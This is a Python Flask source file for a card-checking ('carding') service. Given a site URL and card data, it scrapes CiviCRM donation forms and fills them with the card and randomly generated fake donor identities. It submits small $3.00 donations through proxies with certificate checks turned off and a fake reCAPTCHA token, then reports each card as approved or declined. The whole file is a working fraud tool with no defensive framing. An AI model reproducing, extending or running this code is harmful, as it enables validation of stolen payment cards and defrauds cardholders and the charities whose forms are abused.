from flask import Flask, request, jsonify
import random
import requests
import logging
import re
import time
import os
import string
import ssl
import urllib3
from urllib3.util.ssl_ import create_urllib3_context
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

# ====================== LOGGING ======================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
# ====================================================

requests.packages.urllib3.util.connection.HAS_IPV6 = False
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

class IgnoreSSLAdapter(requests.adapters.HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        ctx = create_urllib3_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kwargs['ssl_context'] = ctx
        return super().init_poolmanager(*args, **kwargs)

def generate_random_user_data():
    first_names = ["John", "Sarah", "Michael", "Emily", "David", "Jessica", "James", "Lauren", "Robert", "Maria"]
    last_names = ["Smith", "Johnson", "Brown", "Taylor", "Wilson", "Davis", "Clark", "Harris"]
    email_domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
    
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    email_prefix = f"{first_name.lower()}{random.randint(1000,9999)}"
    email = f"{email_prefix}@{random.choice(email_domains)}"
    
    return {
        'first_name': first_name,
        'last_name': last_name,
        'email': email,
        'street_address': f"{random.randint(100,9999)} Main St",
        'city': 'New York',
        'postal_code': '10001',
        'state_id': '1000',
        'phone': f"{random.randint(200,999)}-{random.randint(200,999)}-{random.randint(1000,9999)}"
    }

def clean_card_number(ccnum):
    return re.sub(r'\D', '', ccnum)

def get_card_type(ccnum):
    ccnum = clean_card_number(ccnum)
    if ccnum.startswith('4'): return "Visa"
    elif ccnum.startswith('5'): return "MasterCard"
    elif ccnum.startswith('3'): return "Amex"
    elif ccnum.startswith('6'): return "Discover"
    return "Visa"

def create_session(proxy_url=None):
    session = requests.Session()
    session.mount('https://', IgnoreSSLAdapter())
    session.mount('http://', IgnoreSSLAdapter())
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    }
    session.headers.update(headers)
    
    if proxy_url:
        if not proxy_url.startswith('http'):
            proxy_url = f'http://{proxy_url}'
        session.proxies = {"http": proxy_url, "https": proxy_url}
    return session

def detect_payment_processor(html):
    if re.search(r'authorize\.net|authorizenet|Authorize\.Net', html, re.I):
        return ['authorize']
    if re.search(r'stripe', html, re.I):
        return ['stripe']
    return []

def extract_raw_fields(html, soup, form):
    payload = {}
    inputs = form.find_all('input')
    
    # Submit button
    submit_button_name = "_qf_Main_upload"
    submit_button_value = "1"
    for inp in inputs:
        if inp.get('type') in ['submit', 'button'] and '_qf_' in str(inp.get('name', '')):
            submit_button_name = inp.get('name')
            submit_button_value = inp.get('value', '1')
            break
    
    payload['_submit_button_name'] = submit_button_name
    payload['_submit_button_value'] = submit_button_value
    
    for inp in inputs:
        name = inp.get('name')
        if not name: continue
        input_type = inp.get('type', 'text')
        value = inp.get('value', '')
        if input_type == 'radio':
            if name not in payload:
                payload[name] = {'value': value, 'type': input_type, 'options': []}
            if value and value not in payload[name].get('options', []):
                payload[name].setdefault('options', []).append(value)
            if inp.get('checked'):
                payload[name]['value'] = value
        else:
            payload[name] = {'value': value, 'type': input_type}
    
    # Select & Textarea
    for sel in form.find_all('select'):
        name = sel.get('name')
        if name:
            options = [opt.get('value', '') for opt in sel.find_all('option')]
            default = sel.find('option', selected=True)
            default_val = default.get('value', '') if default else (options[0] if options else '')
            payload[name] = {'value': default_val, 'type': 'select', 'options': options}
    
    for txt in form.find_all('textarea'):
        name = txt.get('name')
        if name:
            payload[name] = {'value': txt.get_text(strip=True), 'type': 'textarea'}
    
    # Payment Processor ID
    payment_processor_id = None
    for inp in inputs:
        name = inp.get('name', '').lower()
        if 'payment_processor' in name:
            value = inp.get('value')
            if value:
                payment_processor_id = value
                break
    if payment_processor_id:
        payload['_detected_payment_processor_id'] = {'value': payment_processor_id}
    
    return payload

def get_form_action_and_payload(session, url, proxy_url):
    try:
        resp = session.get(url, timeout=15, allow_redirects=True)
        html = resp.text
        
        # Extract qfKey
        qfkey = None
        for pattern in [r'name="qfKey"\s+value="([^"]+)"', r'qfKey=([a-zA-Z0-9]+)']:
            match = re.search(pattern, html)
            if match:
                qfkey = match.group(1)
                break
        if not qfkey:
            return None, None, None, None, "No qfKey"
        
        processors = detect_payment_processor(html)
        has_authorize = 'authorize' in processors
        
        soup = BeautifulSoup(html, 'html.parser')
        form = soup.find('form') or soup.find('form', id=re.compile(r'Main|Contribution', re.I))
        if not form:
            return None, None, None, None, "Form not found"
        
        form_action = form.get('action')
        if form_action and not form_action.startswith('http'):
            form_action = urljoin(url, form_action)
        
        payload = extract_raw_fields(html, soup, form)
        return qfkey, form_action, payload, has_authorize, "OK"
        
    except Exception as e:
        return None, None, None, None, str(e)

def parse_response(html, url):
    soup = BeautifulSoup(html, 'html.parser')
    status_div = soup.find('div', class_=re.compile(r'status|alert|error', re.I))
    
    if status_div:
        error_text = status_div.get_text(strip=True)
        return {'approved': False, 'message': f'Form Error: {error_text}', 'clean_response': error_text}
    
    if '_qf_ThankYou_display=true' in url:
        return {'approved': True, 'message': 'Payment complete'}
    
    return {'approved': False, 'message': 'Form Incomplete / Stuck'}

def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_url, is_confirm=False):
    scheme = get_card_type(ccnum)
    full_year = f"20{yy}" if len(yy) == 2 else yy
    final_payload = {}
    
    final_payload["qfKey"] = qfkey
    final_payload["entryURL"] = base_url.replace("&amp;", "&")
    final_payload["g-recaptcha-response"] = "03AGdBq25FakeTokenCivicrmBypass1234567890abcdef123456"
    
    if is_confirm:
        final_payload["_qf_default"] = "Confirm:next"
        final_payload["_qf_Confirm_next"] = "1"
    else:
        final_payload["_qf_default"] = "Main:upload"
        submit_name = raw_payload.get('_submit_button_name', '_qf_Main_upload')
        final_payload[submit_name] = raw_payload.get('_submit_button_value', '1')
    
    if '_detected_payment_processor_id' in raw_payload:
        final_payload['payment_processor_id'] = raw_payload['_detected_payment_processor_id'].get('value', '1')
    
    price_selected = False
    for key, field_info in raw_payload.items():
        if key.startswith('_') or not isinstance(field_info, dict):
            continue
        key_lower = key.lower()
        current_value = field_info.get('value', '')
        
        if 'card' in key_lower and any(x in key_lower for x in ['number', 'no', 'num']):
            final_payload[key] = ccnum
        elif any(x in key_lower for x in ['cvv', 'cvc', 'cid', 'security']):
            final_payload[key] = cvv
        elif 'exp' in key_lower and any(x in key_lower for x in ['year', 'y']):
            final_payload[key] = full_year
        elif 'exp' in key_lower and any(x in key_lower for x in ['month', 'm']):
            final_payload[key] = str(int(mm))
        elif 'first' in key_lower and 'name' in key_lower:
            final_payload[key] = user_data['first_name']
        elif 'last' in key_lower and 'name' in key_lower:
            final_payload[key] = user_data['last_name']
        elif 'email' in key_lower:
            final_payload[key] = user_data['email']
        elif any(x in key_lower for x in ['street', 'address']):
            final_payload[key] = user_data['street_address']
        elif 'city' in key_lower:
            final_payload[key] = user_data['city']
        elif any(x in key_lower for x in ['zip', 'postal']):
            final_payload[key] = user_data['postal_code']
        elif 'phone' in key_lower:
            final_payload[key] = user_data['phone']
        elif any(x in key_lower for x in ['price', 'amount']):
            if not price_selected:
                final_payload[key] = "3.00"
                price_selected = True
            else:
                final_payload[key] = "0"
        elif current_value:
            final_payload[key] = current_value
    
    return final_payload

def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
    base_url = site_data['url']
    raw_payload = site_data['payload']
    form_action = site_data['form_action']
    qfkey = site_data['qfkey']
    session = site_data.get('session')
    
    user_data = generate_random_user_data()
    ccnum = clean_card_number(ccnum)
    
    logger.info(f"Starting process for {base_url}")
    logger.info(f"Raw keys: {list(raw_payload.keys())}")
    
    clean_initial = build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_url, is_confirm=False)
    
    # === FULL LOG ===
    logger.info("=== FINAL PAYLOAD BEING SENT ===")
    for k, v in sorted(clean_initial.items()):
        if any(word in k.lower() for word in ['card', 'cvv', 'password', 'token']):
            logger.info(f"{k}: [REDACTED]")
        else:
            logger.info(f"{k}: {v}")
    # ================
    
    origin_url = urlparse(base_url).scheme + "://" + urlparse(base_url).netloc
    session.headers.update({"Referer": base_url, "Origin": origin_url})
    
    response = session.post(form_action, data=clean_initial, timeout=30, allow_redirects=True)
    logger.info(f"Response Code: {response.status_code} | Final URL: {response.url}")
    
    if "problem with your form submission" in response.text.lower():
        logger.warning("=== ERROR RESPONSE HTML ===")
        logger.warning(response.text[:2500])
    
    result = parse_response(response.text, response.url)
    return result, 3.0

@app.route('/auth', methods=['GET'])
def handle_auth():
    site = request.args.get('site')
    cc_param = request.args.get('cc')
    proxy_param = request.args.get('proxy')
    
    if not site or not cc_param:
        return jsonify({"error": "Missing parameters"}), 400
    
    try:
        cc, mm, yy, cvv = cc_param.split('|')
    except:
        return jsonify({"error": "Invalid CC format"}), 400
    
    override_proxy = proxy_param
    session = create_session(override_proxy)
    
    qfkey, form_action, payload, has_authorize, err_msg = get_form_action_and_payload(session, site, override_proxy)
    
    if err_msg != "OK":
        return jsonify({"status": "failed", "message": err_msg})
    
    site_data = {
        'url': site,
        'payload': payload,
        'form_action': form_action,
        'qfkey': qfkey,
        'session': session
    }
    
    result, price = process_card_on_site(site_data, cc, mm, yy, cvv, override_proxy)
    
    return jsonify({
        "Gateway": "Authorized.net",
        "Price": price,
        "Result": "Approved" if result.get('approved') else "Declined",
        "Response": result.get('message', 'Unknown'),
        "Status": result.get('approved', False),
        "cc": cc_param
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
